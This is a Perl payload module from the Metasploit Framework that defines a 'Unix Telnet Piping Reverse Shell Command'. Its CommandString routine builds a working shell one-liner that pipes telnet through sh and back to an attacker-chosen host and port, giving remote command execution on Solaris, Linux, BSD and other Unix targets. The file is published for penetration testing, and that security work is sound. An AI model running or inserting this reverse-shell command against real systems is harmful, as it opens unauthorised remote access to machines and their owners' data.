
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::cmd_unix_reverse_cross;
use strict;
use base 'Msf::PayloadComponent::CommandPayload';
sub load {
  Msf::PayloadComponent::CommandPayload->import('Msf::PayloadComponent::DoubleReverseConnection');
}

my $info =
{
  'Name'         => 'Unix Telnet Piping Reverse Shell Command',
  'Version'      => '$Revision$',
  'Description'  => 'Use telnet|sh|telnet to simulate reverse shell',
  'Authors'      => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'         => [  ],
  'Priv'         => 0,
  'OS'           => [ 'solaris', 'linux', 'bsd', 'hpux', 'irix', 'aix' ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

sub CommandString {
  my $self = shift;
  my $host = $self->GetVar('LHOST');
  my $port = $self->GetVar('LPORT');

  my $command =
    "sleep 1;".
    "telnet $host $port|".
    "while : ; do sh && break; done 2>&1|".
    "telnet $host $port";
    
  return($command);
}

1;